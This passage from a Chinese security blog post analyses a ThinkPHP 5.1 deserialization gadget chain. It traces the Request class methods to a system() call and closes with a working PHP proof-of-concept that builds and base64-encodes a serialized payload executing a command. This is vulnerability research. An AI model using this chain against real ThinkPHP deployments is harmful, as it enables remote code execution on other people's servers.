+<p><code>Attribute</code>类的<code>$data</code></p>
+<h2 id="寻找代码执行点"><a href="#寻找代码执行点" class="headerlink" title="寻找代码执行点"></a>寻找代码执行点</h2><blockquote>
+<p><code>__call</code>一般会存在<code>__call_user_func</code>和<code>__call_user_func_array</code>，php代码执行的终点经常选择这里。我们不止一次在Thinkphp的rce中见到这两个方法。可以在<code>/thinkphp/library/think/Request.php</code>，找到一个<code>__call</code>函数。<code>__call</code> 调用不可访问或不存在的方法时被调用。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">         array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">         <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line"> &#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+<p>但是这里我们只能控制<code>$args</code>，所以这里很难反序列化成功，但是 <code>$hook</code>这里是可控的，所以我们可以构造一个hook数组<code>&quot;visable&quot;=&gt;&quot;method&quot;</code>，但是<code>array_unshift()</code>向数组插入新元素时会将新数组的值将被插入到数组的开头。这种情况下我们是构造不出可用的payload的。</p>
+<blockquote>
+<p>分析过 <strong>ThinkPHP</strong> 历史 <strong>RCE</strong> 漏洞的人可能知道， <strong>think\Request</strong> 类的 <strong>input</strong> 方法经常是链中一个非常棒的 <strong>Gadget</strong> ，相当于 <strong>call_user_func($filter,$data)</strong> 。但是前面我们说过， <strong>$args</strong> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 <strong>input</strong> 方法，而应该寻找调用 <strong>input</strong> 的方法</p>
+</blockquote>
+<blockquote>
+<p>在Thinkphp的Request类中还有一个功能<code>filter</code>功能，事实上Thinkphp多个RCE都与这个功能有关。我们可以尝试覆盖<code>filter</code>的方法去执行代码。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">            <span class="comment">// 获取原始数据</span></span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">            array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">            <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">            <span class="comment">// 强制类型转换</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p> 注意: array_walk_recursive — 对数组中的每个成员递归地应用用户函数</p>
+<p><a href="https://www.php.net/manual/zh/function.array-walk-recursive.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.array-walk-recursive.php</a></p>
+</blockquote>
+<p>跟进<code>getFilter()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$this-&gt;filter</code>可控,则<code>$filter</code>可控</p>
+<p>再看看<code>filterValue()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
+<p>可惜<code>$value</code>并不能直接控制</p>
+<p><img src="http://ww1.sinaimg.cn/large/00643K3ogy1gblrmuv24pj31040gl459.jpg" alt="20191002211012-f79980d0-e515-1.png"></p>
+<p>接下来便需要寻找调用<code>input()</code>方法的方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">...	</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">          <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">          $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">          $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>依旧不可控,继续寻找调用<code>param()</code>方法的地方,最终定位到<code>isAjax()</code>,不过<code>isPjax()</code>也是可以利用的,因为他们传入 <code>param()</code>方法的第一个参数均可控。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样,一条利用链就完整了</p>
+<p>如果我们想执行 <strong>system(‘id’)</strong> 代码，那么我们只要让传入的 <strong>Request</strong> 对象的 <strong>$this-&gt;filter=’system’</strong> 且 <strong>$this-&gt;param=array(‘id’)</strong> 即可</p>
+<p><img src="http://ww1.sinaimg.cn/large/00643K3ogy1gblsqaplnpj313h0omgux.jpg" alt="20191002211046-0c03a88e-e516-1.png"></p>
+<h2 id="参考POC"><a href="#参考POC" class="headerlink" title="参考POC"></a>参考POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"lin"</span>=&gt;[<span class="string">"calc.exe"</span>,<span class="string">"calc"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"lin"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">'lin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></p>
+<p><a href="https://xz.aliyun.com/t/6619#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/6619#toc-0</a></p>
+<p><a href="https://xz.aliyun.com/t/6467" target="_blank" rel="noopener">https://xz.aliyun.com/t/6467</a></p>
+<p><a href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/02/原始套接口与ICMP/" rel="next" title="原始套接口与ICMP">
+                <i class="fa fa-chevron-left"></i> 原始套接口与ICMP
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/touxiang.png" alt="R1dd1er">
+            
+              <p class="site-author-name" itemprop="name">R1dd1er</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找代码执行点"><span class="nav-number">4.</span> <span class="nav-text">寻找代码执行点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考POC"><span class="nav-number">5.</span> <span class="nav-text">参考POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R1dd1er</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
